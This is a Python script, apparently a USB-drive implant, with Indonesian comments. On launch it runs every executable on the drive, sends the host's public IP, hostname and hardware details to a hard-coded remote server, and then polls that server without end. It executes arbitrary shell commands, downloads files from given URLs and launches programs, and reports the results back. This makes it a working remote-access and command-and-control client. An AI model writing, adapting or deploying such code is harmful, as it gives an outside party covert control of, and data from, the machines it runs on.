import os
import subprocess
import threading
import time
import socket
import requests
import platform
import psutil
import json
from concurrent.futures import ThreadPoolExecutor

# ========== KONFIGURASI ==========
SERVER_URL = "https://vercel-server-black.vercel.app"  # Ganti dengan URL Vercel Anda
# =================================

def get_public_ip():
    services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://checkip.amazonaws.com']
    for url in services:
        try:
            return requests.get(url, timeout=3).text.strip()
        except:
            continue
    return "UNKNOWN_IP"

def get_hostname():
    return socket.gethostname()

def get_hardware_info():
    """Kumpulkan informasi hardware lengkap"""
    info = {
        "os": platform.system() + " " + platform.release(),
        "os_version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": psutil.cpu_count(logical=True),
        "cpu_freq_mhz": psutil.cpu_freq().max if psutil.cpu_freq() else None,
        "ram_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "ram_available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
        "disk_usage": {}
    }
    # Disk info
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info["disk_usage"][part.device] = {
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent": usage.percent
            }
        except:
            pass
    # GPU (sederhana, lewat wmic di Windows)
    if platform.system() == "Windows":
        try:
            gpu = subprocess.check_output("wmic path win32_VideoController get name", shell=True, text=True)
            lines = gpu.strip().split('\n')[1:]
            info["gpu"] = [line.strip() for line in lines if line.strip()]
        except:
            info["gpu"] = ["Tidak terdeteksi"]
    else:
        info["gpu"] = ["N/A"]
    return info

def scan_executables(flashdisk_root):
    exe_list = []
    for root, _, files in os.walk(flashdisk_root):
        for file in files:
            if file.lower().endswith('.exe'):
                exe_list.append(os.path.join(root, file))
    return exe_list

def run_exe_parallel(exe_path):
    try:
        subprocess.Popen([exe_path], shell=True)
        print(f"[RUN] {exe_path}")
    except Exception as e:
        print(f"[ERROR] {exe_path}: {e}")

def send_initial_report(ip, hostname, hardware, exe_list):
    url = f"{SERVER_URL}/report"
    data = {
        "ip": ip,
        "hostname": hostname,
        "hardware": hardware,
        "executables": exe_list
    }
    try:
        resp = requests.post(url, json=data, timeout=10)
        if resp.status_code == 200:
            print("[SERVER] Laporan awal terkirim")
        else:
            print(f"[SERVER] Gagal kirim laporan awal: {resp.status_code}")
    except Exception as e:
        print(f"[SERVER] Error: {e}")

def poll_commands(hostname):
    """Polling perintah dari server setiap 10 detik"""
    url_poll = f"{SERVER_URL}/poll_commands"
    url_result = f"{SERVER_URL}/command_result"
    while True:
        try:
            resp = requests.post(url_poll, json={"hostname": hostname}, timeout=5)
            if resp.status_code == 200:
                commands = resp.json()
                for cmd in commands:
                    cmd_id = cmd['id']
                    cmd_type = cmd['command_type']
                    cmd_data = cmd['command_data']
                    print(f"[COMMAND] Terima perintah {cmd_type}: {cmd_data}")
                    # Eksekusi perintah
                    status, result = execute_command(cmd_type, cmd_data)
                    # Laporkan hasil
                    requests.post(url_result, json={
                        "command_id": cmd_id,
                        "status": status,
                        "result": result
                    }, timeout=5)
            time.sleep(10)
        except Exception as e:
            print(f"[POLLING] Error: {e}")
            time.sleep(30)

def execute_command(cmd_type, cmd_data):
    """Jalankan perintah berdasarkan tipe"""
    try:
        if cmd_type == "text":
            # Tampilkan pesan di console client
            print(f"\n[PESAN DARI SERVER]: {cmd_data}\n")
            return "success", "Pesan ditampilkan"
        elif cmd_type == "download":
            # Download file dari URL dan simpan ke flashdisk
            local_filename = os.path.basename(cmd_data.split('/')[-1])
            if not local_filename:
                local_filename = "downloaded_file"
            filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), local_filename)
            r = requests.get(cmd_data, stream=True)
            with open(filepath, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
            return "success", f"File disimpan ke {filepath}"
        elif cmd_type == "run":
            # Jalankan perintah sistem (CMD/shell)
            output = subprocess.check_output(cmd_data, shell=True, text=True, stderr=subprocess.STDOUT, timeout=30)
            return "success", output[:1000]
        elif cmd_type == "exec_exe":
            # Jalankan file .exe yang ada di flashdisk
            exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), cmd_data)
            if os.path.exists(exe_path):
                subprocess.Popen([exe_path], shell=True)
                return "success", f"Menjalankan {cmd_data}"
            else:
                return "failed", f"File {cmd_data} tidak ditemukan di flashdisk"
        else:
            return "failed", f"Tipe perintah tidak dikenal: {cmd_type}"
    except Exception as e:
        return "failed", str(e)[:500]

def autorun_animation():
    import sys
    msg = "*** SELAMAT DATANG DI FLASHDISK CERDAS ***"
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    for ch in msg:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def main():
    threading.Thread(target=autorun_animation, daemon=True).start()
    ip = get_public_ip()
    hostname = get_hostname()
    hardware = get_hardware_info()
    flash_root = os.path.dirname(os.path.abspath(__file__))
    exe_files = scan_executables(flash_root)
    print(f"Ditemukan {len(exe_files)} file .exe di flashdisk")

    # Jalankan semua .exe secara paralel
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(run_exe_parallel, exe_files)

    # Kirim laporan awal ke server
    send_initial_report(ip, hostname, hardware, exe_files)

    # Mulai polling perintah dari server (tetap berjalan)
    poll_commands(hostname)

if __name__ == "__main__":
    main()